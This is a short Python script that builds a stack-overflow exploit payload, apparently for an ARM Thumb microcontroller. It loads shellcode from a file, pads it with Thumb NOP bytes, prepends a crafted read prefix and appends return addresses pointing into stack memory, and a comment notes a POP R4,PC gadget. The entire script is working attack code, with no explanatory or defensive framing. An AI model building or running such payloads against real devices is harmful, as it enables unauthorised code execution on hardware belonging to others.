#!/usr/bin/env python3

import struct

PL_STG3 = b""
PL_STG3 += struct.pack("<l",0x20004000)
PL_STG3 += struct.pack("<l",0x20001fc1) # return to stack.

READ_PAYLOAD = b"b \x00" + b"b " * 10 + b"\x11"

f = open("shellcode/sc.bin","rb")
sc = f.read()
f.close()

print("Bytes remaining for payload:")
print(hex(0x300 - len(READ_PAYLOAD)))

while len(READ_PAYLOAD) < (0x300 - len(sc)):
  READ_PAYLOAD += b"\xc0\x46"  # nop.

READ_PAYLOAD += sc

# POP R4,PC = 10 BD

print(hex(len(READ_PAYLOAD)))

READ_PAYLOAD += PL_STG3


